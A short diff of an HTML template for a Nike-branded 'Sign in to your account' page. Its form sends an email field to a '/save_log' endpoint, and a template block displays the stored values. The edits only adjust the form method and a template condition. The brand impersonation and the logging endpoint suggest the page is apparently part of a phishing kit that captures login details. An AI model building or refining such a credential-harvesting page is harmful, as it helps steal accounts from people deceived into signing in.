@@ -9,7 +9,7 @@
 <div class="hero">
     <p>Just do it with <strong>Nike</strong></p>
     <h2>Sign in to your account</h2>
-    <form action="/save_log" method="post">
+    <form action="/save_log" method=POST>
         <div class="form-box">
             <div class="card-box">
                 <input type="email" name="email" id="email" placeholder="Email address">
@@ -25,7 +25,7 @@
 </div>
 <br><br>
 <br><br>
-{{ if . }}
+{{ if .coms }}
 <h3>
     {{.}}
 </h3>
